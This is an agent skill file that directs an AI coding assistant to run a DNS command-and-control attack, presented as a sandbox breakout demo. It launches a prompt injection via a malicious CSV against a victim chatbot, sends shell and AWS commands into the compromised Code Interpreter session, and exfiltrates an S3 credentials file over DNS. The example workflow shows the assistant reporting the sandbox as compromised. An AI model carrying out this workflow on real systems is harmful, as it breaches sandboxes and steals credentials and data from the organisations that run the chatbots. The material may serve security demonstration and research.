---
name: c2
description: DNS C2 operator skill for the AgentCore sandbox breakout demo. This skill should be used when the user asks to run C2 verification, attack a victim chatbot, send commands to a compromised session, retrieve exfiltrated data, or interact with the DNS C2 system.
---

# DNS C2 Operator Skill

This skill automates the DNS C2 attack workflow for the AgentCore sandbox breakout demo.

## Prerequisites

Before using this skill, ensure:
1. Attacker infrastructure is deployed (`cd attacker-infra && make terraform-yolo`)
2. Environment variables are set (`source attacker-infra/set_env_vars.sh`)
3. The C2 server is running (`make configure-ec2`)

## Usage Modes

### Mode 1: Full Attack (target URL provided)

When the user asks to attack or verify a target URL:
- "Run the C2 verification on http://victim-chatbot.example.com"
- "Attack the victim chatbot at http://..."
- "Test the prompt injection against http://..."

**Workflow:**
1. Run the attack command and capture the session ID
2. Wait for the payload to execute (poll for ~10 seconds)
3. Send initial reconnaissance commands (whoami, aws sts get-caller-identity)
4. Report results to user

### Mode 2: Attach to Existing Session

When the user provides a session ID:
- "Attach to session sess_abc12345"
- "Connect to the C2 session sess_..."

**Workflow:**
1. Attach to the existing session
2. Ready to send commands

### Mode 3: Execute Command

When user asks to run a command in the compromised session:
- "Run whoami on the compromised session"
- "Execute aws s3 ls"
- "Send the command: aws dynamodb list-tables"

**Workflow:**
1. Send the command to the active session
2. Wait for output (poll every 2 seconds, max 30 seconds)
3. Display results

## Quick Commands (Recommended)

Use the bundled `c2.sh` script for simpler command execution:

```bash
# Attack a target
.claude/skills/c2/scripts/c2.sh attack https://victim-chatbot.example.com

# Send command to session
.claude/skills/c2/scripts/c2.sh send "whoami" sess_abc12345

# Receive output
.claude/skills/c2/scripts/c2.sh receive sess_abc12345

# Generate malicious CSV
.claude/skills/c2/scripts/c2.sh generate
```

## Implementation Details (Alternative)

### Step 1: Launch Attack

To attack a target URL, run from the `attacker-infra` directory:

```bash
cd /Users/kmcquade/code/kmcquade/agentcore-sandbox-breakout/attacker-infra && \
  source set_env_vars.sh && \
  uv run c2 attack <TARGET_URL> --c2-domain $DOMAIN
```

**Parse the session ID** from the output. Look for lines like:
- `Session ID: sess_abc12345`
- `[+] Session ID: sess_abc12345`

Store the session ID for subsequent commands.

### Step 2: Send Commands

To send a command to an active session:

```bash
cd /Users/kmcquade/code/kmcquade/agentcore-sandbox-breakout/attacker-infra && \
  source set_env_vars.sh && \
  uv run c2 send "<COMMAND>" --session <SESSION_ID>
```

Example:
```bash
uv run c2 send "whoami" --session sess_abc12345
```

### Step 3: Receive Output

To retrieve output from the session:

```bash
cd /Users/kmcquade/code/kmcquade/agentcore-sandbox-breakout/attacker-infra && \
  source set_env_vars.sh && \
  uv run c2 receive --session <SESSION_ID>
```

**Important:** Output may take 3-10 seconds to arrive via DNS exfiltration. Poll multiple times if needed.

### Step 4: Polling Strategy

When waiting for command output:

1. Wait 3 seconds after sending command
2. Run `receive` command
3. If output is empty or shows "waiting", wait 2 more seconds and retry
4. Retry up to 5 times (total ~15 seconds)
5. Report timeout if no output received

## Common Commands to Demonstrate

After successful attack, run these commands to demonstrate the vulnerability:

1. **Identity check:**
   ```
   whoami
   ```

2. **List S3 buckets:**
   ```
   aws s3 ls
   ```

3. **List sensitive data:**
   ```
   aws s3 ls s3://agentcore-hacking-sensitive-data --recursive
   ```

4. **Exfiltrate file contents:**
   ```
   aws s3 cp s3://agentcore-hacking-sensitive-data/credentials/api-keys.json -
   ```

5. **List DynamoDB tables:**
   ```
   aws dynamodb list-tables
   ```

## Session State Management

Track the following state during the session:

- `ACTIVE_SESSION_ID`: The current session ID (e.g., `sess_abc12345`)
- `TARGET_URL`: The victim chatbot URL being attacked
- `LAST_COMMAND`: The last command sent
- `COMMAND_COUNT`: Number of commands executed

When reporting to the user, include:
- Session ID
- Commands executed
- Output received
- Any errors encountered

## Error Handling

### "Cannot reach C2 server"
The C2 server may not be running. Suggest: `cd attacker-infra && make configure-ec2`

### Empty output after multiple polls
The payload may not have executed. Suggest checking:
- Victim chatbot is accessible
- CSV was processed correctly
- DNS queries are reaching the C2 server (`make logs`)

### Session timeout
Code Interpreter sessions timeout after 15 minutes. Need to run a new attack.

## Example Full Workflow

```
User: /c2 https://victim-chatbot.example.com

Claude executes:
1. uv run c2 attack https://victim-chatbot.example.com --c2-domain $DOMAIN
   -> Parses session ID: sess_x7k2m9p1

2. Waits 5 seconds for payload to execute

3. uv run c2 send "whoami" --session sess_x7k2m9p1

4. Waits 3 seconds

5. uv run c2 receive --session sess_x7k2m9p1
   -> Output: "genesis1ptools"

6. Reports to user:
   "Attack successful! Session sess_x7k2m9p1 established.

   whoami -> genesis1ptools

   The sandbox has been compromised. Ready for more commands."
```
